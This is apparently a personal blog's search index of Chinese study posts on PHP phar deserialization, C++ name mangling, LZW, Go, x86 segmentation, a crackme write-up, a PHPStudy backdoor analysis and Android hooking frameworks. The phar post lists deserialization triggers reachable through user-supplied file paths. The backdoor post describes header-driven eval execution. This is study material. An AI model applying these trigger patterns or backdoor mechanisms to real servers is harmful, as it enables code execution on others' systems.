<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[TODO...]]></title>
    <url>%2FTODO.html</url>
    <content type="text"><![CDATA[TODO…约束自己执行想要执行的事情 This is my TODO… 还在学习中…]]></content>
  </entry>
  <entry>
    <title><![CDATA[phar反序列化]]></title>
    <url>%2Fphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html</url>
    <content type="text"><![CDATA[漏洞作用在不使用unserialize()函数的情况下触发PHP反序列化漏洞 触发条件使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Meta data 信息会被反序列化 如果要生成phar文件，要在php.ini中把phar只读给关闭 123php.ini[Phar]phar.readonly = Off 案例演示1234567891011121314&lt;?php$phar = new Phar('test.phar');$phar-&gt;startBuffering();$phar-&gt;addFromString('test.txt', 'text');$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;'); // add object of any class as meta dataclass AnyClass &#123;&#125;$object = new AnyClass;$object-&gt;data = 'rips';$phar-&gt;setMetadata($object);$phar-&gt;stopBuffering(); 1php -c /Applications/XAMPP/xamppfiles/etc/php.ini phar.php //执行生成的文件如下 1234567891011121314&lt;?php// add object of any class as meta dataclass AnyClass &#123; function __destruct()&#123; echo $this-&gt;data; &#125; function __sleep()&#123; echo 'sleep'; &#125; function __wakeup()&#123; echo 'wakeup&lt;br&gt;'; &#125;&#125;include('phar://test.phar'); // 触发反序列化 能够触发反序列化的函数有12345678910include('phar://test.phar');var_dump(file('phar://test.phar'));var_dump(fopen('phar://test.phar','r'));var_dump(file_get_contents('phar://test.phar'));var_dump(file_get_contents('phar://test.jpg'));(把文件名改成jpg也有效)var_dump(file_exists('phar://test.phar'));file_exists($_GET['file']);md5_file($_GET['file']);filemtime($_GET['file']);filesize($_GET['file']); referhttps://mp.weixin.qq.com/s/TNAdeBNBErYjtTGGfentFg]]></content>
      <categories>
        <category>学习研究</category>
      </categories>
      <tags>
        <tag>phar反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++ 符号修饰和函数签名]]></title>
    <url>%2FC-%E7%AC%A6%E5%8F%B7%E4%BF%AE%E9%A5%B0%E5%92%8C%E5%87%BD%E6%95%B0%E7%AD%BE%E5%90%8D.html</url>
    <content type="text"><![CDATA[前言 在开始的时候，源文件与目标文件的函数的符号名是相同的。后来UNIX平台和C语言发明时，已经存在很多汇编编写的库和目标文件，一个C程序要使用他们，就不能定义这些库中定义的函数和变量的名字作为符号，否则会产生冲突。为了防止类似的符号名冲突，UNIX下的C语言就规定，C语言源代码文件中的所有全局的变量和函数经过编译以后，相对应的符号名前加上下划线”“。而Fortran语言的源代码经过编译以后，所有的符号名前加上”“，后面也加上”_”。比如一个C语言函数”foo”，那么它编译后的符号名就是”_foo”；如果是Fortran语言，就是”foo“。 这种方法能够暂时减少多种语言目标文件之间的符号冲突的概率，但还是没有从根本上解决符号冲突的问题。比如同一种语言编写的目标文件还有可能会产生符号冲突，于是像C++这样的后来设计的语言开始考虑到了这个问题，增加了名称空间（Namespace）的方法来解决多模块的符号冲突问题。 在现在的Linux下的GCC编译器中，默认情况下已经去掉了在C语言符号前加”“的这种方式；但是Windows平台下的编译器还保持的这样的传统，比如Visual C++编译器就会在C语言符号前加”“，GCC在Windows平台下的版本（cygwin、mingw）也会加”_”。GCC编译器也可以通过参数选项”-fleading-underscore”或”-fno-leading-underscore”来打开和关闭是否在C语言符号前加上下划线。 符号修饰1234567891011121314int func(int); float func(float); class C &#123; int func(int); class C2 &#123; int func(int); &#125;; &#125;; namespace N &#123; int func(int); class C &#123; int func(int); &#125;; &#125; 上面的6个函数签名在GCC编译器下，相对应的修饰后名称如下所示： 1234567函数签名 符号名int func(int) _Z4funcifloat func(float) _Z4funcfint C::func(int) _ZN1C4funcEiint C::C2::func(int) _ZN1C2C24funcEiint N::func(int) _ZN1N4funcEiint N::C::func(int) _ZN1N1C4funcEi GCC的基本C++名称修饰方法如下 所有的符号都以”_Z”开头，对于嵌套的名字（在名称空间或在类里面的），后面紧跟”N”，然后是各个名称空间和类的名字，每个名字前是名字字符串长度，再以”E”结尾。 比如N::C::func经过名称修饰以后就是_ZN1N1C4funcE。 对于一个函数来说，它的参数列表紧跟在”E”后面，对于int类型来说，就是字母”i”。 所以整个N::C::func(int)函数签名经过修饰为_ZN1N1C4funcEi。 C++中的全局变量和静态变量也有同样的机制 对于全局变量来说，它跟函数一样都是一个全局可见的名称，它也遵循上面的名称修饰机制，比如一个名称空间foo中的全局变量bar，它修饰后的名字为：_ZN3foo3barE。 变量的类型并没有被加入到修饰后名称中，所以不论这个变量是整形还是浮点型甚至是一个全局对象，它的名称都是一样的。 名称修饰机制也被用来防止静态变量的名字冲突。 比如 main() 函数里面有一个静态变量叫foo，而 func() 函数里面也有一个静态变量叫foo。 为了区分这两个变量，GCC会将它们的符号名分别修饰成两个不同的名字”_ZZ4mainE3foo”和”_ZZ4funcE3foo”.]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C++符号修饰</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LZW无损压缩算法]]></title>
    <url>%2FLZW%E6%97%A0%E6%8D%9F%E5%8E%8B%E7%BC%A9%E7%AE%97%E6%B3%95.html</url>
    <content type="text"><![CDATA[前言 在看writeup的时候，题目含有base64和lzw算法，由于不了解lzw算法，遂学习一下。 简介 LZW就是通过建立一个字符串表，用较短的代码来表示较长的字符串来实现压缩。 加密 从原字符串不断地读入新的字符，并试图将单个字符或字符串编码为记号 (Symbol)。 维护两个变量，一个是P (Previous)，表示手头已有的，还没有被编码的字符串，一个是C (current)，表示当前新读进来的字符。 初始状态，字典里只有所有的默认项，例如0-&gt;a，1-&gt;b，2-&gt;c。此时P和C都是空的。 读入新的字符C，与P合并形成字符串P+C。 在字典里查找P+C，如果: P+C在字典里，P=P+C。 P+C不在字典里，将P的记号输出；在字典中为P+C建立一个记号映射；更新P=C。 返回步骤2重复，直至读完原字符串中所有字符。 以上表示的是编码中间的一般过程，在收尾的时候有一些特殊的处理，即步骤2中，如果到达字符串尾部，没有新的C读入了，则将手头的P对应的记号输出，结束。 编码过程的核心就在于第3步，需要理解P究竟是什么。P是当前维护的，可以被编码为记号的子串。注意P是可以被编码为记号，但还并未输出。新的字符C不断被读入并添加到P的尾部，只要P+C仍然能在字典里找到，就不断增长更新P=P+C，这样就能将一个尽可能长的字串P编码为一个记号，这就是压缩的实现。当新的P+C无法在字典里找到时，我们没有办法，输出已有的P的编码记号，并为新子串P+C建立字典表项。然后新的P从单字符C开始，重新增长，重复上述过程。 12345678910111213141516171819202122232425262728293031323334353637383940用一个例子来说明编码的过程ababcababac初始状态字典里有三个默认的映射：Symbol String0 a1 b2 c开始编码：Step P C P+C P+C in Dict ？ Action Output1 - a a Yes 更新P=a -2 a b ab No 添加3-&gt;ab，更新P=b 03 b a ba No 添加4-&gt;ba，更新P=a 14 a b ab Yes 更新P=ab -5 ab c abc No 添加5-&gt;abc，更新P=c 36 c a ca No 添加6-&gt;ca，更新P=a 27 a b ab Yes 更新P=ab -8 ab a aba No 添加7-&gt;aba，更新P=a 39 a b ab Yes 更新P=ab -10 ab a aba Yes 更新P=aba -11 aba c abac No 添加8-&gt;abac，更新P=c 712 c - - - - 2注意编码过程中的第3-4步，第7-8步以及8-10步，子串P发生了增长，直到新的P+C无法在字典中找到，则将当前的P输出，P则更新为单字符C，重新开始增长。输出的结果为0132372，完整的字典为：Symbol String0 a1 b2 c3 ab4 ba5 abc6 ca7 aba8 abac原字符串对应到压缩后的编码的0 1 3 2 3 7 2a b ab c ab aba c 解密 初始状态，字典里只有所有的默认项，例如0-&gt;a，1-&gt;b，2-&gt;c。此时pW和cW都是空的。 读入第一个的符号cW，解码输出。注意第一个cW肯定是能直接解码的，而且一定是单个字符。 赋值pW=cW。 读入下一个符号cW。 在字典里查找cW，如果: cW在字典里： 解码cW，即输出 Str(cW)。 令P=Str(pW)，C=Str(cW)的第一个字符。 在字典中为P+C添加新的记号映射。 cW不在字典里: 令P=Str(pW)，C=Str(pW)的第一个字符。 在字典中为P+C添加新的记号映射，这个新的记号一定就是cW。 输出P+C。 返回步骤3重复，直至读完所有记号。 12345678910111213141516171819记号0 1 3 2 3 7 2解码a b ab c ab aba c初始状态字典里有三个默认的映射：Symbol String0 a1 b2 cStep pW cW cW in Dict ？ Action Output0 - 0 Yes P=-,C=a,P+C=a a1 0 1 Yes P=a，C=b，P+C=ab，添加3-&gt;ab b2 1 3 Yes P=b，C=a，P+C=ba，添加4-&gt;ba ab3 3 2 Yes P=ab，C=c，P+C=abc，添加5-&gt;abc c4 2 3 Yes P=c，C=a，P+C=ca，添加6-&gt;ca ab5 3 7 No P=ab，C=a，P+C=aba，添加7-&gt;aba aba6 7 2 Yes P=aba，C=c，P+C=abac，添加8-&gt;abac c 总结123默认的映射表通常为255行，也就是ASCII码表的长度，拓展从256开始。加密：不断读取源数据，直到不在映射表里，输出P并添加一个新的映射解密：读取记号流，如果在映射表里，就输出并添加一个映射 REFLZW压缩算法]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>LZW压缩算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[目录遍历到递归]]></title>
    <url>%2F%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%88%B0%E9%80%92%E5%BD%92.html</url>
    <content type="text"><![CDATA[前言 半个月感觉没收获多少，主要学习了加密解密、编译原理、Windows内核相关基础教程、Golang的学习，并没有学完，一直在坚持和学校一样的教学体系，每天的课程是不一样的，不会导致学习疲劳，三分热度，一直抱着一本书看下去，几天就失了兴趣，比如编译原理… 一步一jo印 中序 之前学习Java时，没有想到写一个遍历指定目录的程序，最近在学习Golang，想着用GO语言实现以下。 思路 指定需要遍历的目录 列出目录下的所有文件以及文件夹 打印文件名或文件夹名 判断是否为文件夹，是则去第1步，否则去第5步 退出 后续 用递归的方式实现该程序 12345678910111213141516171819202122232425262728package mainimport ( "fmt" "io/ioutil")func main() &#123; listDir("/Users/bufsnake", 0)&#125;func listDir(dir string, level int) &#123; s := "" for i := 0; i &lt; level; i++ &#123; s = s + " " &#125; fileInfos, err := ioutil.ReadDir(dir) if err != nil &#123; fmt.Println(err) &#125; for _, file := range fileInfos &#123; fi := dir + "/" + file.Name() fmt.Println(s + fi) if file.IsDir() &#123; listDir(fi, level+1) &#125; &#125;&#125; 运行结果 12345678910111213141516171819202122232425262728293031323334353637383940414243444546☁ golang go run mulubianli.go/Users/bufsnake/golang/_ /Users/bufsnake/golang/_/main.go/Users/bufsnake/golang/array.go/Users/bufsnake/golang/bufio /Users/bufsnake/golang/bufio/main.go/Users/bufsnake/golang/ch1 /Users/bufsnake/golang/ch1/dup1 /Users/bufsnake/golang/ch1/dup1/main.go /Users/bufsnake/golang/ch1/dup2 /Users/bufsnake/golang/ch1/dup2/file /Users/bufsnake/golang/ch1/dup2/main.go /Users/bufsnake/golang/ch1/echo1 /Users/bufsnake/golang/ch1/echo1/main.go /Users/bufsnake/golang/ch1/echo2 /Users/bufsnake/golang/ch1/echo2/main.go /Users/bufsnake/golang/ch1/echo3 /Users/bufsnake/golang/ch1/echo3/main.go /Users/bufsnake/golang/ch1/helloworld /Users/bufsnake/golang/ch1/helloworld/README.md /Users/bufsnake/golang/ch1/helloworld/main.go /Users/bufsnake/golang/ch1/server1 /Users/bufsnake/golang/ch1/server1/mian.go/Users/bufsnake/golang/chabie /Users/bufsnake/golang/chabie/chabie /Users/bufsnake/golang/chabie/main.go/Users/bufsnake/golang/deferDemo.go/Users/bufsnake/golang/deferDemo1.go/Users/bufsnake/golang/exception.go/Users/bufsnake/golang/func.go/Users/bufsnake/golang/gob_msgpack.go/Users/bufsnake/golang/main.go/Users/bufsnake/golang/mapDemo.go/Users/bufsnake/golang/mulubianli.go/Users/bufsnake/golang/rand /Users/bufsnake/golang/rand/main.go/Users/bufsnake/golang/strconv /Users/bufsnake/golang/strconv/main.go/Users/bufsnake/golang/time /Users/bufsnake/golang/time/main.go/Users/bufsnake/golang/web /Users/bufsnake/golang/web/ch1 /Users/bufsnake/golang/web/ch1/login.gtpl /Users/bufsnake/golang/web/ch1/main /Users/bufsnake/golang/web/ch1/main.go /Users/bufsnake/golang/web/ginDemo.go 总结 Go Go Golang]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sudo提权漏洞复现]]></title>
    <url>%2FSudo%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html</url>
    <content type="text"><![CDATA[开篇 该漏洞虽然鸡肋，但保不准哪天碰到了，还是复现一下吧 Sudoer 修改sudoer文件,如下 我的低权限用户账号是admin admin 在admin账号权限下运行 在vim界面输入 得到root权限 影响版本 sudo 1.8.28 之前的所有版本 修复建议 升级sudo]]></content>
      <categories>
        <category>学习研究</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[段的机制浅析]]></title>
    <url>%2F%E6%AE%B5%E7%9A%84%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90.html</url>
    <content type="text"><![CDATA[开篇 X86 CPU的3个模式：实模式(直接操作物理地址)、保护模式(操作虚拟内存)和虚拟8086模式(保护模式下的16位模拟) X64：x86是intel推出的复杂指令集，后来amd拓展了X86指令集，称为称为x86-64，后更名为AMD 64，intel也出了自己的一套64位指令集，但是不向下兼容，所以就没了，继而移植了amd 64位指令集，称为intel 64(能够兼容x86指令集的) 段的机制段寄存器12mov dword ptr ds:[0x123456],eax实际操作的是 ds.base + 0x123456 地址 段寄存器的种类 ES(拓展段)、CS(代码段)、SS(堆栈段)、DS(数据段)、FS、GS、LDTR、TR 共8个段寄存器 段寄存器的读写1234读只能读16位，写能写入96位mov ax, ds 必须指定写入的地址为16位mov ds, eax除LDTR和TR外，其余段寄存器可用MOV指令进行读写 段寄存器的结构 1234567struct SegMent&#123; WORD Selecter, 16bit//可见部分 段选择子 WROD Attribute, 16bit//属性 可读/可写/可执行 DWORD Base, 16bit//Base 段的起始地址 DWORD Limit 16bit//Limit 段的整体长度&#125;; 根据上图进行段寄存器的不可见部分探测探测Attribute是否存在12345678910#include &lt;stdio.h&gt;int main()&#123; __asm&#123; mov ax, cs mov ds, ax //ds == cs mov dword ptr ds:[0x1000], eax //对ds.base + 0x1000 地址进行操作就相当于对 cs.base + 0x1000 地址进行操作，但由于 cs 属性是不可写，所以编译出错。 &#125; return 0;&#125; 探测Base是否存在1234567891011#include &lt;stdio.h&gt;int main()&#123; __asm&#123; mov ax, fs mov ds, ax //ds == fs mov dword ptr ds:[0], eax //对ds.base + 0x0 地址进行操作就相当于对 fs.base + 0x0 地址进行操作 //等同 mov dword ptr [0x7FFDE000], eax ,正常情况下，我们对0地址是不能读也不能写，这里可以编译通过，是因为我们对地址 0x0x7FFDE000 进行写操作。将fs换成其余的段寄存器，就会报错 &#125; return 0;&#125; 探测Limit是否存在12345678910#include &lt;stdio.h&gt;int main()&#123; __asm&#123; mov ax, fs mov ds, ax //ds == fs mov dword ptr ds:[0x1000], eax //对ds.base + 0x1000 地址进行操作就相当于对 fs.base + 0x1000 地址进行操作，但由于 fs 支持的长度只是到0xFFF，0x1000 &gt; 0xFFF，所以编译出错。 &#125; return 0;&#125; 段描述符与段选择子GDT(全局描述符表)与LDT(本地描述符表) windbg查看GDT表 12345r gdtr //查看GDT表的位置r gdtl //查看GDT表的长度dd 0x80808080(地址) //查看指定地址的内容(四字节查看)dq 0x80808080(地址) //查看指定地址的内容(八字节查看)dq 0x80808080(地址) L40 //查看指定地址的内容(八字节查看)，显示40组 段选择子结构 段描述符结构 123456789数据 E 拓展位 根据D/B位可知段的上限，0为64kb，1为4GB。 向上拓展 ds.base + limit 的红色区域是可用的 向下拓展 出了红色部分，其余是可用的代码 C 一致位 非一致代码段 一致代码段 段权限检查 CPU分为四个级别R0、R1、R2、R3(操作系统并没有使用R1、R2)，R0运行内核记驱动程序，R3运行用户层程序。 CPL：当前特权级别 12345678910111213根据CS、SS的段选择子的RPL值可知道CPL的值假设CS为0x001B（0000 0000 0001 1011）RPL为3，所以CPL为3，所以应用程序运行在3环，是用户层程序。数据段的权限检查 检查CPL权限是否大于等于DPL，RPL权限是否大于等于DPL 假设CPL = 0 mov ax，000B mov ds，ax //RPL = 3，指向的段描述符的DPL为0 CPL权限与DPL相同，检测通过，RPL权限比DPL权限低，检测失败代码段、系统描述符的权限检查与数据段不完全相同，后面会学习到。 段寄存器的操作 mov ds, ax //ds的值不能乱给，需要符合段选择子 除了mov指令还可以使用 LES，LSS，LDS，LFS，LGS指令修改段寄存器的值 没有LCS是因为更改CS涉及到更改EIP。 1234567891011例： les ecx, fword ptr ds:[0x1000] //将ds.base + 0x1000 地址处的内容的高两个字节放入es，剩下四个字节放入ecx。fwrod（6字节）假设ax = 0x001B（0000 0000 0001 1011）所以：RPL = 3（请求特权级别为3，由11给出） 所要查询的表是GDT表（由 0 给出） 指定获取表中下标为3的段描述符（由0000 0000 0001 1给出,假设为 0x004F9AFF`0xFFFFFFFF） 根据段描述符可得 段基地址：0x00FFFFFF 段极限：0x000FFFFF(G位为0，所以在前面填充12个0) 段的属性：0x4F9A 回过头，在看一下段寄存器的结构123456789struct SegMent&#123; WORD Selecter, 16bit//可见部分 段选择子 指向的是段选择子结构 WROD Attribute, 16bit//属性 可读/可写/可执行 指向的是段描述符结构的 G + D/B + L + AVL + 段界限0 + P + DPL + S + TYPE DWORD Base, 32bit//Base 段的起始地址 指向的是段描述符结构的 段基地址0 + 段基地址1 + 段基地址2 DWORD Limit 32bit//Limit 段极限 指向的是段描述符结构的 段界限0 + 段界限1 合起来是20位，根据 G 位的值，若为0，则在其前面填充12位的0，最大就为0x000FFFFF，若为1，则在其后面填充12位的1，最大就为0xFFFFFFFF&#125;;虽然只能可见部分只有16bit，但是通过它去查找GDT/LDT表，就能获得其余80bit的值 总结 学习完这些，能够知道RPL、DPL、CPL分别只什么，怎么找到，段选择子与段描述符的结构以及每一位的作用，如何找到DGT/LDT表，能够按顺序背下ES、CS、SS、DS、FS、GS、LSTR、TR的名字，给一个段选择子能够分析出段的其余80bit的值。]]></content>
      <categories>
        <category>保护机制</category>
      </categories>
      <tags>
        <tag>段的机制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[KCTF-1]]></title>
    <url>%2FKCTF-1.html</url>
    <content type="text"><![CDATA[初世纪 输入不正确就会出现这个弹窗 ida打开程序定位WinMain函数 找到DialogBoxParam的回调函数 123456789函数原型： int DialogBoxParam（HINSTANCE hInstance，LPCTSTR IpTemplateName,HWND hWndParent， DLGPROC IPDialogFunc,LPARAM dwlnitParam）；参数：hlnstance 标识一个模块的实例，该模块的可执行文件含有对话框模板。IpTemplateName 标识对话框模板。此参数可以指向一个以NULL结尾的字符串的指针,该字符串指定对话框模扳名，或是指定对话框模板的资源标识符的一个整型值。如果此参数指定了一个资源标识符，则它的高位字一定为零，且低位字一定含有标识符。一定用MAKEINTRESOURCE宏指令创建此值。hWndParent 指定拥有对话框的窗口。IpDialogFunc 指向对话框过程的指针。dwInitParam 指定传递到对话框过程中的 WM_INITDIALOG 消息 IParam 参数的值。返回值 如果函数调用成功则返回值为在对函数EndDialog的调用中的nResult参数，该EndDialog函数用于中止对话框。如果函数调用失败，则返回值为-1。 F5大法定位关键代码 123456789函数功能：该函数获取对话框中与控制有关的文本或标题。函数原型 UINT GetDlgltemText(HWND hDlg,int nlDDlltem,LPTSTR IpString int nMazCount);参数 hDlg 指向含有控制的对话框的句柄。 nlDDlgltem 指定标题或文本将被检索的控制的标识符。 IpString 指向获取标题或文本的缓冲器的指针。 nMaxCount 指定被复制到lpString参数指向的缓冲区的字符串的最大长度。如果字符串的字符最大长度超过范围，则该字符串被截断。返回值 如果函数调用成功，则返回值表示被复制缓冲区的字符串的长度，不包括以NULL结尾的字符串。如果函数调用失败,则返回值为零。若想获得更多错误信息，请调用GetLastError函数。 得到注册码为6Ewi9H 验证 Exam OD调试之 通过字符串找到关键点 可以看出来一些流程，输入字符串，得到长度，然后判断是否在10～30之间，将字符串copy到另外一个地方，比较字符串的第八个位置是否为’A’。 进入此函数 该函数的逻辑是：将输入的第七个字符串换成’#’，字符串的每位都与0x1F进行xor运算。然后下面没有思路了 IDA查看之 找到字符串(将字符串复制到的地址)的交叉引用，挨个扫一眼 可以看到这一个函数 找到该函数的交叉引用 可以看到第二个参数就是’invalid argument’ 关键比较处，a2就是’invalid argument’ ^ 28后的结果，dword_2F3088就是我们输入字符串复制到的地址 在关键部分下断点，可以得到比较的字符串 到此，程序整体逻辑也就明了了，输入字符串，判断第八位是否为A，将第八位换成#，整体字符在与 0x1f 异或，得到的字符 和 ‘invalid argument’与28异或后的结果相比较 脚本1234567891011121314In [1]: flag = "invalid argument"In [2]: temp = ''In [3]: for i in range(0,len(flag)): ...: temp += chr(ord(flag[i]) ^ 28)In [4]: tempOut[4]: 'urj&#125;pux&lt;&#125;n&#123;iqyrh'In [5]: for i in range(0,len(temp)): ...: flag += chr(ord(temp[i]) ^ 0x1f)In [6]: flag = ''In [7]: for i in range(0,len(temp)): ...: flag += chr(ord(temp[i]) ^ 0x1f)In [8]: flagOut[8]: 'jmubojg#bqdvnfmw'# 最后将#换成'A'即可 验证 总结 KCTF的题目质量是真的好，准备把这几年的比赛题目都拿来做做，学习学习，还是有很多姿势的。。。。]]></content>
  </entry>
  <entry>
    <title><![CDATA[MacOS上IDA pro的小问题修复]]></title>
    <url>%2FMacOS-IDA-pro-%E8%87%B4%E6%9C%80%E5%82%BB%E7%9A%84%E6%88%91.html</url>
    <content type="text"><![CDATA[前言 每次打开ida32位版本的，都会出现卡顿几秒的情况，之前也想办法解决了，但是没能成功，趁着国庆的喜气，搞了一下，才知道是个啥情况，这里简单记录一下。 权限问题 第一次遇到文件权限后门带@的，以为是这个问题，然后就疯狂Google，才得知这是Mac OS X文件系统的附加属性 文件的读写权限中被加上了一个@符号，这就是 Mac OS X 文件系统的附加属性（extended attributes） 这个属性下，打开文件显示错误为：项目“XXX”已被OS X 使用，不能打开 xattr1xattr -c filename # 可以清除这个附加属性 天真的以为清除附加属性后，打开就没有问题了，然而，我错了。还是没能解决 查看系统日志 出现签名的问题，然后又是一番疯狂Google 允许应用控制电脑，所以每次打开应用Mac OS X都会检测程序的签名问题。可能是因为我的IDA补丁的问题。 取消勾选 允许应用控制电脑 即可解决问题。 总结 困扰了有两个月了，搞得我都对那个程序有些恐惧，都不想打开它，今天终于解决了。学到姿势了。]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>MacOS IDA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPStudy后门研究]]></title>
    <url>%2FPHPStudy%E5%90%8E%E9%97%A8%E7%A0%94%E7%A9%B6.html</url>
    <content type="text"><![CDATA[声明：分析文章仅限用于学习和研究目的,不得将学习成果用于商业或者非法用途,否则,一切后果请用户自负. PHPStudy 后门文件 php/ext目录下的php_xmlrpc.dll文件 。 检测是否存在后门 记事本打开文件，查看是否存在如下所示的字符串，如果有说明存在后门，可升级官方最新版。 IDA分析后门文件 根据字符串信息，快速定位关键函数 根据判断请求头的Accept-Encoding是否为gzip,deflate进行判断Accept-Charset的值base64解密是否成功，如果成功就对它进行gzcompress压缩，然后执行@eval(gzuncompress(data)); 相关检测脚本 github已经有大佬上传了，需要研究学习的朋友，可以自己搜索 声明：分析文章仅限用于学习和研究目的,不得将学习成果用于商业或者非法用途,否则,一切后果请用户自负.]]></content>
      <categories>
        <category>学习研究</category>
      </categories>
      <tags>
        <tag>phpstudy后门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[模2运算]]></title>
    <url>%2F%E6%A8%A12%E8%BF%90%E7%AE%97.html</url>
    <content type="text"><![CDATA[模2运算 简介：将数字换算成二进制的形式进行运算，无进位也无借位。 模2加法12345678910111213141516171 + 1 = 01 + 0 = 10 + 1 = 10 + 0 = 0 1010101+ 1000101———————————— 0010000 10101011+ 10100111+ 11100010———————————— 11101110奇数个1相加得1，偶数个1相加得0 模2减法1234567891011121314151 - 1 = 01 - 0 = 10 - 1 = 10 - 0 = 0 1010101- 1000101———————————— 0010000 10101011- 10100111- 11100010———————————— 11101110 模2乘法1234567891 x 1 = 11 x 0 = 00 x 1 = 00 x 0 = 0 1010101x 1000101———————————— 1000101 模2除法123456789101112131415161718192021运算的时候每位都进行xor运算规则：被除数除以除数,被除数首位为1时,商1,为0时商0 所得余数去除首位(左移一位) 重复上一步直到被除数位数少于除数位数例子：1111000对除数1101做模2除法: 1011 商 ------------1101/ 1111000 被除数 首位为1，商为1 1101 除数 ------------ 0010000 余数去除首位,作为新的被除数，首位为0，商为0 0000 被除数首位为0，则除数就为0 ------------ 010000 余数去除首位,作为新的被除数，首位为1，商为1 1101 被除数首位为1,除以除数 ------------ 01010 余数去除首位,作为新的被除数，首位为1，商为1 1101 被除数首位为1,除以除数 ------------ 0111 余数去除首位，为111位数为3，小于除数位数4，不再进行运算，得到结果结果：商1011余111]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Xposed hook框架学习]]></title>
    <url>%2FXposed-hook%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.html</url>
    <content type="text"><![CDATA[Xposed 安装xposed.apk 框架 初次运行是点击 安装/更新 就行了，后续在激活模块的时候可以点击 软重启 重启手机(模拟器) 模块 显示已安装的模块，打勾的说明是已经激活的 下载 显示网上已经有的模块，别人开发好的，可以直接拿过来用的那种 设置 日志 显示模块运行时后的日志信息，可用来显示XposedBridge.log(“”);打印出来的消息 关于 第一个模块学习在build.gradle中添加信息12compileOnly 'de.robv.android.xposed:api:82'compileOnly 'de.robv.android.xposed:api:82:sources' 导入框架需要的依赖 AndroidManifest.xml添加如下信息 123456789&lt;meta-data android:name="xposedmodule" 该程序是否是xposed的模块 android:value="true" /&gt;&lt;meta-data android:name="xposeddescription" 对本模块的功能的描述，可以自己简单的描述一下可以了 android:value="Module测试" /&gt;&lt;meta-data android:name="xposedminversion" 是本模块开发时用到的Xposed的jar包最低版本号 android:value="54" /&gt; 注意该段代码的放置位置 添加模块的入口函数 新建一个类，为Xposed模块的主类，新建一个assets目录，在目录下创建一个file xposed_init，里面添上模块入口函数的路径 编写模块的主要代码12345678910111213141516171819202122232425package com.example.info;import android.widget.TextView;import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.XposedBridge;import de.robv.android.xposed.XposedHelpers;import de.robv.android.xposed.callbacks.XC_LoadPackage;public class Main implements IXposedHookLoadPackage &#123; public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable &#123; if(lpparam.packageName.equals("com.example.helloworld"))&#123; XposedHelpers.findAndHookMethod(TextView.class, "setText",CharSequence.class, new XC_MethodHook() &#123; protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; param.args[0] = "isHookedbe"; &#125; protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; param.args[0] = "isHookedaf"; &#125; &#125;); &#125; &#125;&#125; 作用是HOOK TextView的setText方法 被Hook的程序的MainActivity1234567891011121314151617181920212223242526272829package com.example.helloworld;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.TextView;public class MainActivity extends AppCompatActivity &#123; private Button b; private TextView t; @Override public void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); b = (Button)findViewById(R.id.button); t = (TextView)findViewById(R.id.textView); b.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View view) &#123; t.setText("aaaaaaaaaaaaaaa"); &#125; &#125;); &#125;&#125; 在点击程序后本应该会显示aaaaaaaaaaaaaaa，hook之后会显示isHookedbe 看图 总结 先Hook成功一个案例，然后实现各种操作吧，可以看看官方的api]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>xposed框架</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[frida Hook神器学习-1]]></title>
    <url>%2Ffrida-Hook%E7%A5%9E%E5%99%A8%E5%AD%A6%E4%B9%A0-1.html</url>
    <content type="text"><![CDATA[Android三大框架对比Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点：Xposed的优缺点 优点：在编写Java层hook插件的时候非常好用，这一点完全优越于Frida和SubstrateCydia，因为他也是Android项目，可以直接编写Java代码调用各类api进行操作。而且可以安装到手机上直接使用。 缺点：配置安装环境繁琐，兼容性差，在Hook底层的时候就很无助了。 Frida的优缺点 优点：在上面我们可以看到他的优点在于配置环境很简单，操作也很便捷，对于破解者开发阶段非常好用。支持Java层和Native层hook操作，在Native层hook如果是非基本类型的话操作有点麻烦。 缺点：因为他只适用于破解者在开发阶段，也就是他没法像Xposed用于实践生产中，比如我写一个微信外挂用Frida写肯定不行的，因为他无法在手机端运行。也就是破解者用的比较多。 SubstrateCydia的优缺点 优点：可以运行在手机端，和Xposed类似可以用于实践生产中。支持Java层和Native层的hook操作，但是Java层hook不怎么常用，用的比较多的是Native层hook操作，因为他也是Android工程可以引用系统api，操作更为方便 缺点：和Xposed一样安装配置环境繁琐，兼容性差。 总结 